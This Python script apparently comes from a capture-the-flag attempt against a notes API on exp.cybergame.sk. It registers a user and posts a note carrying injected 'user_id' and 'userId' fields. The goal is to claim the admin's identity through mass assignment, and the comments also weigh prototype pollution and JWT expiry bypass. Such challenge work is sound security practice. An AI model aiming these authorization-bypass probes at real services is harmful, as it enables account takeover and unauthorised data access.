import requests

# What if we pollute `ignoreExpiration: true` to use an old token? We don't have an old token for admin.
# What if we pollute `userId`?
# In `v2.js`, maybe it does `req.user = { id: ... }`.
# When creating a note, does it use `req.user.id` or `req.body.userId`?
# In `req3.py` I tried polluting `userId: 1` and `user_id: 1` when creating a note, but when I listed notes I only saw my own notes.

# Let's check `api/v2/notes` prototype pollution again.
# When creating a note, the DB probably does: `db.run("INSERT INTO notes (title, content, user_id) VALUES (?, ?, ?)", [req.body.title, req.body.content, req.user.id])`.
# If it uses `req.body.user_id`, we can pass it directly without prototype pollution!
url = "http://exp.cybergame.sk:7021/api/v2/notes"

payload = {
    "title": "admin_test",
    "content": "test",
    "user_id": 1,
    "userId": 1
}
# register a user to get token
r_reg = requests.post("http://exp.cybergame.sk:7021/api/v2/register", json={"username": "admin2010", "password": "password"}, headers={"Content-Type": "application/json"})
token = r_reg.json().get("token")

r = requests.post(url, json=payload, headers={"Content-Type": "application/json", "Authorization": f"Bearer {token}"})
print("Create:", r.text)

r2 = requests.get(url, headers={"Authorization": f"Bearer {token}"})
print("List:", r2.text)
